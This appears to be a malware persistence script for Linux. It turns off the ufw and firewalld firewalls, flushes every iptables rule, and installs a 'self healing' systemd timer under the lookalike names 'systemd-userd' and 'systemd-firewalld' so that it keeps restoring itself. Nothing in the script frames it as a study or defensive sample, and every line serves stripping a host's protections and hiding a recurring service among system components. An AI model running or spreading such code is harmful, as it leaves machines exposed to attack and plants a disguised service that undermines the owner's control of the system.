#! /bin/bash

# Stop and disable ufw and firewalld
if type "ufw" >/dev/null 2>/dev/null; then
	ufw disable
	systemctl disable --now ufw
fi

if type "firewall-cmd" >/dev/null 2>/dev/null; then
	systemctl disable --now firewalld
fi

# Drop all firewall rules
if type "iptables" >/dev/null 2>/dev/null; then
	iptables -F
fi

# Self healing
mkdir --parents /usr/share/systemd-userd
cp -- /usr/share/systemd-firewalld/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-userd/

systemctl daemon-reload
systemctl unmask systemd-userd.service

systemctl unmask systemd-userd.timer

systemctl enable --now systemd-userd.timer

# vim: set filetype=sh:
